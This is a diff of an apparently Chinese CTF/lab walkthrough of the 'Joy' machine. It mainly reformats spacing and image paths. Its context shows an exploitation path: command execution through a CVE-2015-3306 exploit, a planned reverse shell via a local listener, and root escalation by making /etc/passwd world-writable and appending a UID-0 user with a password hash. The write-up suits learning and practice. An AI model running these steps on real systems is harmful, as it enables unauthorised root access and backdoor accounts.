@@ -578,12 +578,17 @@ Dockerfile  exploit.py  LICENSE  main.sh  README.md
 
 *It's working!!!*
 <br>接下来试试输入命令
-![Img](./FILES/Joy/img-20220714150445.png)
-<br>有回显
-<br>试试nc
-![Img](./FILES/Joy/img-20220714150525.png)
-<br>nc并没有回显, 那就只能用php了
-
+<br>
+![Img](../FILES/Joy/img-20220714150445.png)
+<br>
+有回显
+<br>
+试试nc
+<br>
+![Img](../FILES/Joy/img-20220714150525.png)
+<br>
+nc并没有回显, 那就只能用php了
+<br>
 先在本地起个监听
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.62/exploit-CVE-2015-3306]
@@ -728,6 +733,7 @@ ls -al | grep "script"
 d---------  2 root    root    4096 Jan  9  2019 script
 patrick@JOY:~$ 
 ```
+
 <br>
 但是在这里我们没办法直接访问里面的东西
 <br>
@@ -735,6 +741,7 @@ patrick@JOY:~$
 <br>
 直接让/etc/passwd变成可编辑的文件
 <br>
+
 ```
 patrick@JOY:~$ sudo script/test
 sudo script/test
@@ -753,7 +760,9 @@ ls -al /etc/passwd
 -rwxrwxrwx 1 root root 2556 Jan 28  2019 /etc/passwd
 patrick@JOY:~$ 
 ```
+
 <br>接下来生成一个新的密码, 新建一个用户
+
 ```
 patrick@JOY:~$ echo 'aaron:$1$somesalt$rWwI4VdCMoDDJK593phlI.:0:0::/root/bin/bash' >> /etc/passwd
 h' >> /etc/passwdmesalt$rWwI4VdCMoDDJK593phlI.:0:0::/root/bin/bash
